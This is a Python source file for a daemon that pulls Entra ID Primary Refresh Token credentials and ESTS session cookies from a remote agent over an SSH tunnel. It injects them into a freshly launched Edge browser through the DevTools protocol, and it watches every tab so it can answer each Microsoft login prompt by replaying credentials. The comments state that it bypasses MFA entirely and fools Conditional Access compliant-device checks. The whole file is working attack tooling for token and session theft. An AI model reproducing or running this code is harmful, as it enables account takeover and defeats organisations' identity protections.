"""
normal_sync.py  --  Persistent AAD SSO daemon for a NON-Entra-ID machine.

Network topology (3-machine setup):

    Entra ID machine  ──reverse SSH──►  SSH server  ◄──local forward──  This machine

  On the Entra ID machine:
      .\\PrtAgent.exe --port <PORT>
      ssh -R <PORT>:localhost:<PORT> user@ssh-server

  On this (normal) machine:
      ssh -L <PORT>:localhost:<PORT> user@ssh-server
      python normal_sync.py --port <PORT>

  NOTE: "ssh -R <PORT>" (no colons) is dynamic SOCKS forwarding — it will NOT
  work here.  You must include the destination: "-R <PORT>:localhost:<PORT>".

Usage:
    python normal_sync.py [--entraid-port PORT] [--socks-port PORT] [--socks PROXY]

Arguments:
    --entraid-port PORT  Port PrtAgent listens on the Entra ID machine (default: 5555)
    --socks-port PORT    Local port of the SSH dynamic-SOCKS forward (default: 1080).
                         Builds socks5h://127.0.0.1:<PORT> automatically.

Behaviour:
  - Launches Edge and navigates to portal.azure.com on startup.
  - Watches ALL Edge tabs continuously.
  - Any AAD authorize URL (portal, SharePoint, Teams, …) is handled
    automatically, including the sso_reload second pass.
  - Press Ctrl-C to stop.
"""

import argparse, json, os, shutil, subprocess, sys, time, threading, traceback
import requests
try:
    import websocket
    if not hasattr(websocket, 'create_connection'):
        raise ImportError("wrong package")
except ImportError:
    sys.exit("[!] websocket-client is not installed. Run:  pip install websocket-client")

# ---------------------------------------------------------------------------
# Static config (not user-facing)
# ---------------------------------------------------------------------------
EDGE_EXE          = os.path.expandvars(
    r"%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe")
if not os.path.exists(EDGE_EXE):
    EDGE_EXE = os.path.expandvars(
        r"%ProgramFiles%\Microsoft\Edge\Application\msedge.exe")

EDGE_DEBUG_PORT   = 9224
EDGE_PROFILE      = os.path.join(os.environ.get("USERPROFILE", os.path.expanduser("~")),
                                  "EdgePrtProfile")
# WinAccountsExt ships with Windows and bridges the AAD BssoInterrupt_Core.js
# window.postMessage channel to BrowserCore via native messaging.  Loading it
# here causes the content script to set brcap=1 at document_start (before AAD's
# scripts read the cookie), which activates BssoInterrupt on the login page.
# BrowserCore is not available on a non-Entra machine, but since we pre-inject
# the x-ms-RefreshTokenCredential cookie, BssoInterrupt reads it from
# document.cookie directly without ever needing to call BrowserCore.
WIN_ACCOUNTS_EXT  = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                  "WinAccountsExt")

# Populated from CLI args in __main__ before any function is called
AGENT_URL   = ""
SOCKS_PROXY = ""
# ---------------------------------------------------------------------------


def _agent_session() -> requests.Session:
    """Return a requests.Session configured to reach the agent (with optional SOCKS)."""
    s = requests.Session()
    if SOCKS_PROXY:
        s.proxies = {"http": SOCKS_PROXY, "https": SOCKS_PROXY}
    return s


def _prt_extract_remote(url: str) -> list:
    """POST the authorize URL to PrtAgent and return all credential dicts.
    Each dict has 'name' and 'data' keys.
    BrowserCore typically returns two credentials:
      - x-ms-RefreshTokenCredential  (HS256, proves user identity via PRT)
      - x-ms-DeviceCredential        (RS256, proves device compliance via device cert)
    Both must be injected to satisfy Conditional Access 'compliant device' policies.
    Without x-ms-DeviceCredential, AAD falls back to MFA even with a valid PRT.
    """
    with _agent_session() as s:
        resp = s.post(
            "{}/extract".format(AGENT_URL),
            json={"url": url},
            timeout=30,
        )
        resp.raise_for_status()
        creds = resp.json()["credentials"]
        if not isinstance(creds, list):
            creds = [creds]
        # Strip trailing cookie attributes (e.g. ";path=/;domain=...") from data
        return [{"name": c["name"], "data": c["data"].split(";")[0].strip()} for c in creds]


def _fetch_session_cookies() -> list:
    """GET /session from PrtAgent on the Entra machine.
    Returns a list of cookie dicts (name, value, domain, path, secure,
    httpOnly, expires, sameSite) ready to pass straight to CDP Network.setCookie.
    Returns [] on any error so the PRT flow can act as fallback.
    """
    try:
        with _agent_session() as s:
            resp = s.get("{}/session".format(AGENT_URL), timeout=45)
            resp.raise_for_status()
            cookies = resp.json().get("cookies", [])
            print("[+] Received {} session cookie(s) from Entra machine.".format(len(cookies)))
            return cookies
    except Exception as e:
        print("[!] Could not fetch session cookies: {}".format(e))
        return []


def kill_agent() -> bool:
    """POST /kill to PrtAgent — shuts down the remote agent process gracefully.
    Returns True on success, False if the agent could not be reached.
    """
    try:
        with _agent_session() as s:
            resp = s.post("{}/kill".format(AGENT_URL), timeout=10)
            data = resp.json()
            print("[+] Agent kill: {}".format(data.get("status", resp.text)))
            return True
    except Exception as e:
        print("[!] kill_agent failed: {}".format(e))
        return False


# ---------------------------------------------------------------------------
# CDP helpers  (identical to sync_auth.py)
# ---------------------------------------------------------------------------
class CDPSession:
    def __init__(self, ws_url, connect_timeout=10, recv_timeout=30):
        self._ws_url = ws_url
        self.ws = websocket.create_connection(
            ws_url,
            timeout=connect_timeout,
            origin="http://localhost",
        )
        # Switch to a longer recv timeout after connect so slow agent calls
        # don't cause the socket to drop while waiting for a CDP response.
        self.ws.sock.settimeout(recv_timeout)
        self._id = 0
        self._lock = threading.Lock()   # guards send+recv pairs
        self._closed = False

    def send(self, method, params=None):
        with self._lock:
            if self._closed:
                raise RuntimeError("CDPSession already closed")
            self._id += 1
            msg_id = self._id
            payload = json.dumps({"id": msg_id, "method": method, "params": params or {}})
            self.ws.send(payload)
            while True:
                raw = self.ws.recv()
                msg = json.loads(raw)
                if msg.get("id") == msg_id:
                    if "error" in msg:
                        raise RuntimeError("CDP {}: {}".format(method, msg["error"]))
                    return msg.get("result", {})
                # Discard events / responses for other ids without blocking

    def send_nowait(self, method, params=None):
        """Send a CDP command without waiting for the response.

        Used for Page.navigate: Edge destroys the page's CDP endpoint during
        navigation, so the response frame is never delivered and recv() would
        block until the socket timeout fires.
        """
        with self._lock:
            if self._closed:
                return
            self._id += 1
            payload = json.dumps({"id": self._id, "method": method, "params": params or {}})
            self.ws.send(payload)

    def ping(self):
        """Send a no-op CDP command to keep the WebSocket alive."""
        try:
            with self._lock:
                if self._closed:
                    return
                self._id += 1
                msg_id = self._id
                self.ws.send(json.dumps({"id": msg_id, "method": "Target.getTargetInfo", "params": {}}))
                # Don't wait for a response — just flush the write path
        except Exception:
            pass

    def is_alive(self):
        """Return True if the underlying TCP connection looks healthy."""
        try:
            return self.ws.connected
        except Exception:
            return False

    def close(self):
        self._closed = True
        try:
            self.ws.close()
        except Exception:
            pass


def _get_tabs(port):
    r = requests.get("http://127.0.0.1:{}/json".format(port), timeout=5)
    r.raise_for_status()
    return [t for t in r.json() if t.get("type") == "page"]


def _page_session(port, tab):
    ws = tab["webSocketDebuggerUrl"].replace(
        "localhost:{}".format(port), "127.0.0.1:{}".format(port))
    return CDPSession(ws)


# ---------------------------------------------------------------------------
# Edge launcher
# ---------------------------------------------------------------------------
def _launch_edge():
    subprocess.call(["taskkill", "/F", "/IM", "msedge.exe"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # Wait for all msedge.exe file handles to release.  1.5 s is often too short
    # on a busy machine; we poll the process list until Edge is gone (max 8 s).
    deadline = time.time() + 8
    while time.time() < deadline:
        time.sleep(0.5)
        import subprocess as _sp
        out = _sp.run(["tasklist", "/FI", "IMAGENAME eq msedge.exe", "/NH"],
                      capture_output=True, text=True).stdout
        if "msedge.exe" not in out.lower():
            break
    else:
        time.sleep(1.0)  # last-resort safety margin

    # Wipe the old profile so we always start from a clean cookie/cache state.
    # Stale ESTS cookies or a cached brcap=0 value would cause AAD to skip
    # BssoInterrupt or silently reject a replayed PRT credential.
    if os.path.isdir(EDGE_PROFILE):
        for attempt in range(6):          # retry up to 3 s on WinError 32
            try:
                shutil.rmtree(EDGE_PROFILE)
                print("[+] Cleared old Edge profile: {}".format(EDGE_PROFILE))
                break
            except Exception as e:
                if attempt < 5:
                    time.sleep(0.5)
                else:
                    print("[!] Could not clear profile ({}): {}".format(EDGE_PROFILE, e))

    print("[+] Launching Edge  profile={}  proxy={}".format(EDGE_PROFILE, SOCKS_PROXY))
    args = [
        EDGE_EXE,
        "--remote-debugging-port={}".format(EDGE_DEBUG_PORT),
        "--remote-allow-origins=*",
        "--user-data-dir={}".format(EDGE_PROFILE),
        "--no-first-run",
        "--no-default-browser-check",
        # Route all Edge traffic through the same SOCKS proxy.
        # Edge expects "socks5://host:port"; strip the "h" suffix from socks5h://.
        "--proxy-server={}".format(SOCKS_PROXY.replace("socks5h://", "socks5://") if SOCKS_PROXY else "direct://"),
        "--proxy-bypass-list=127.0.0.1;localhost;[::1]",  # keep CDP/local traffic direct
        # QUIC (HTTP/3) is UDP-based and cannot traverse a SOCKS5 proxy (TCP only).
        # Without this flag Edge attempts QUIC to portal.azure.com, the proxy drops
        # the UDP packets, and when Edge falls back to TCP mid-session the TLS record
        # MAC is already corrupt → ERR_SSL_BAD_RECORD_MAC_ALERT on all portal APIs.
        "--disable-quic",
        # Prevent TLS version/cipher negotiation issues through the SOCKS tunnel.
        "--ssl-version-min=tls1.2",
        "about:blank",
    ]
    # Load the Windows SSO extension so BssoInterrupt_Core.js activates on the
    # AAD login page.  The content script sets brcap=1 at document_start, which
    # is required for AAD to look for the x-ms-RefreshTokenCredential cookie.
    if os.path.isdir(WIN_ACCOUNTS_EXT):
        args.insert(-1, "--load-extension={}".format(WIN_ACCOUNTS_EXT))
    else:
        print("[!] WinAccountsExt not found at {} — brcap=1 will be missing!".format(
            WIN_ACCOUNTS_EXT))
    subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    deadline = time.time() + 15
    while time.time() < deadline:
        try:
            requests.get("http://127.0.0.1:{}/json".format(EDGE_DEBUG_PORT), timeout=2)
            print("[+] Edge ready.")
            return
        except Exception:
            time.sleep(0.5)
    raise RuntimeError("Edge did not start within 15 s")


def _inject_session_cookies(port, cookies):
    """Inject ESTS session cookies from the Entra machine into local Edge via CDP.
    Reuses first available tab.  These cookies (ESTSAUTH / ESTSAUTHPERSISTENT) were
    already issued by AAD after the Entra machine completed its MFA challenge, so
    injecting them makes AAD believe this browser has a live, MFA-satisfied session.
    The PRT flow in _watch_forever() still handles any /authorize prompts that slip
    through (e.g. after session expiry).
    """
    if not cookies:
        return
    try:
        tabs = _get_tabs(port)
        if not tabs:
            print("[!] No Edge tabs found for session-cookie injection.")
            return
        sess = _page_session(port, tabs[0])
        injected = 0
        for c in cookies:
            params = {
                "name":     c["name"],
                "value":    c["value"],
                "domain":   c.get("domain", ".login.microsoftonline.com"),
                "path":     c.get("path", "/"),
                "secure":   c.get("secure", True),
                "httpOnly": c.get("httpOnly", True),
                "sameSite": c.get("sameSite", "None"),
            }
            if c.get("expires", -1) > 0:
                params["expires"] = c["expires"]
            try:
                sess.send("Network.setCookie", params)
                injected += 1
            except Exception as e:
                print("[!] Could not inject cookie {}: {}".format(c["name"], e))
        sess.close()
        print("[+] Injected {}/{} session cookies.".format(injected, len(cookies)))
    except Exception as e:
        print("[!] Session cookie injection failed: {}".format(e))


# ---------------------------------------------------------------------------
# AAD helpers
# ---------------------------------------------------------------------------
def _inject_cookie_with_session(sess, creds, authorize_url):
    """Inject all PRT credentials plus brcap=1 into an already-open CDP
    session and navigate.  Separated from _inject_cookie so the caller can
    pre-open the session before making slow remote calls.
    Network.enable is called first so that Network.setCookie is accepted even
    while the page is mid-navigation (otherwise Edge silently ignores the
    command when the document is in a loading state).
    """
    try:
        sess.send("Network.enable", {})
    except Exception:
        pass
    for i, cred in enumerate(creds):
        sess.send("Network.setCookie", {
            "name":     cred["name"],
            "value":    cred["data"],
            "domain":   ".login.microsoftonline.com",
            "path":     "/",
            "secure":   True,
            "httpOnly": False,
            "url":      "https://login.microsoftonline.com/",
        })
    sess.send("Network.setCookie", {
        "name":     "brcap",
        "value":    "1",
        "domain":   ".login.microsoftonline.com",
        "path":     "/",
        "secure":   False,
        "httpOnly": False,
        "url":      "https://login.microsoftonline.com/",
    })
    sess.send_nowait("Page.navigate", {"url": authorize_url})
    sess.close()


def _inject_cookie(port, tab_id, creds, authorize_url):
    """Open a fresh CDP session for tab_id and inject.
    Falls back to this path only when no pre-opened session is available.
    """
    tabs = _get_tabs(port)
    tab  = next(t for t in tabs if t["id"] == tab_id)
    sess = _page_session(port, tab)
    _inject_cookie_with_session(sess, creds, authorize_url)


def _keepalive_loop(sess, stop_event, interval=5):
    """Send a no-op CDP ping every `interval` seconds until stop_event is set.
    Prevents Edge from closing an idle WebSocket while we wait for the agent."""
    while not stop_event.wait(interval):
        if not sess.is_alive():
            break
        sess.ping()


def _handle_auth(port, tab_id, url):
    """
    Full auth sequence for one AAD authorize URL:
      1. Open a CDP WebSocket to the tab FIRST, before the agent round-trip.
      2. Run a background keepalive thread to prevent Edge closing the idle WS.
      3. Ask agent for ALL PRT credentials bound to the nonce in the URL.
      4. Inject credentials + brcap=1 cookies, navigate.
    """
    t0 = time.time()

    # Step 1 — open CDP session before any slow network call
    try:
        tabs = _get_tabs(port)
        tab  = next((t for t in tabs if t["id"] == tab_id), None)
        if tab is None:
            print("[!] Tab {} disappeared before CDP session could be opened.".format(tab_id[:8]))
            return
        sess = _page_session(port, tab)
    except Exception as e:
        print("[!] Could not open CDP session for tab {}: {}".format(tab_id[:8], e))
        traceback.print_exc()
        return

    # Step 2 — start background keepalive so Edge conserves the WebSocket
    stop_ka = threading.Event()
    ka_thread = threading.Thread(target=_keepalive_loop, args=(sess, stop_ka, 5),
                                 daemon=True, name="cdp-keepalive-" + tab_id[:8])
    ka_thread.start()

    # Step 3 — fetch credentials (slow — travels through tunnel)
    print("[+] Requesting credentials from agent for tab {} ...".format(tab_id[:8]))
    try:
        creds = _prt_extract_remote(url)
    except Exception as e:
        print("[!] Agent extract failed: {}".format(e))
        stop_ka.set()
        sess.close()
        return
    names = ", ".join(c["name"] for c in creds)
    print("[+] Got {} credential(s): {} (+{:.1f}s)".format(
        len(creds), names, time.time() - t0))

    # Stop keepalive before we start inject (avoids lock contention on _lock)
    stop_ka.set()
    ka_thread.join(timeout=2)

    # Step 4 — inject through the already-open session
    try:
        _inject_cookie_with_session(sess, creds, url)
        print("[+] Injected — navigating. (+{:.1f}s total)".format(time.time() - t0))
    except Exception as e:
        print("[!] Cookie inject failed: {}".format(e))
        traceback.print_exc()
        sess.close()


def _watch_forever(port):
    """
    Poll all browser targets continuously.  Whenever any page tab lands on
    an AAD authorize URL that hasn't been handled yet, call _handle_auth.
    This covers portal.azure.com, SharePoint, Teams, and any other app
    that triggers AAD interactive auth.  The sso_reload second pass is
    handled automatically because it also appears as a new authorize URL.
    """
    handled = set()   # (tab_id, url) pairs already sent to the agent
    print("[*] Watching all Edge tabs for AAD auth — press Ctrl-C to stop.\n")
    while True:
        try:
            time.sleep(0.5)
            targets = requests.get(
                "http://127.0.0.1:{}/json/list".format(port), timeout=5
            ).json()
        except KeyboardInterrupt:
            raise
        except Exception:
            continue

        for t in targets:
            if t.get("type") != "page":
                continue
            tab_id = t.get("id", "")
            url    = t.get("url", "")
            if "login.microsoftonline.com" not in url:
                continue
            if "client_id=" not in url:
                continue
            key = (tab_id, url)
            if key in handled:
                continue
            handled.add(key)
            print("[+] AAD auth on tab {} | {}".format(tab_id[:8], url[:90]))
            _handle_auth(port, tab_id, url)


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    ap = argparse.ArgumentParser(
        description="Persistent AAD SSO daemon via PrtAgent + Edge CDP")
    ap.add_argument("--entraid-port", type=int, default=5555,
                    help="Port PrtAgent listens on the Entra ID machine (default: 5555)")
    ap.add_argument("--socks-port",   type=int, default=1080,
                    help="Local port of SSH dynamic-SOCKS forward (default: 1080)")
    ap.add_argument("--kill", action="store_true",
                    help="Send /kill to PrtAgent and exit (stops the remote agent process)")
    args = ap.parse_args()

    socks    = "socks5h://127.0.0.1:{}".format(args.socks_port)
    AGENT_URL   = "http://127.0.0.1:{}".format(args.entraid_port)
    SOCKS_PROXY = socks

    if args.kill:
        sys.exit(0 if kill_agent() else 1)

    print("=" * 60)
    print("  PRT SSO Daemon  (Edge + Entra Agent)")
    print("=" * 60 + "\n")

    print("  Agent URL : {}".format(AGENT_URL))
    print("  SOCKS     : {}".format(SOCKS_PROXY))
    print()

    # 0. Check agent
    print("[+] Checking agent health ...")
    try:
        with _agent_session() as s:
            r = s.get("{}/health".format(AGENT_URL), timeout=10)
            r.raise_for_status()
            h = r.json()
            print("[+] Agent OK — BrowserCore present={}".format(h.get("browser_core", h.get("prt_extract"))))
    except Exception as e:
        print("[!] Cannot reach agent at {}: {}".format(AGENT_URL, e))
        print("    Make sure PrtAgent.exe (or entra_agent.py) is running")
        print("    and the SSH tunnel is active.")
        sys.exit(1)

    if not os.path.exists(EDGE_EXE):
        print("[!] Edge not found at:", EDGE_EXE)
        sys.exit(1)

    # 1. Launch Edge
    _launch_edge()
    time.sleep(1.0)

    # 2. Inject live ESTS session cookies from the Entra machine (bypasses MFA entirely)
    print("[+] Fetching live session cookies from Entra machine ...")
    session_cookies = _fetch_session_cookies()
    if session_cookies:
        _inject_session_cookies(EDGE_DEBUG_PORT, session_cookies)
    else:
        print("[!] No session cookies retrieved — PRT flow will handle auth challenges.")

    # 3. Open portal.azure.com in the first tab
    tabs = _get_tabs(EDGE_DEBUG_PORT)
    tab  = tabs[0]
    print("[+] Navigating to https://portal.azure.com/ ...")
    sess = _page_session(EDGE_DEBUG_PORT, tab)
    sess.send_nowait("Page.navigate", {"url": "https://portal.azure.com/"})
    sess.close()

    # 3. Watch forever — handles the initial portal auth, sso_reload pass,
    #    and any future auth triggered by SharePoint, Teams, etc.
    try:
        _watch_forever(EDGE_DEBUG_PORT)
    except KeyboardInterrupt:
        print("\n[*] Stopped.")
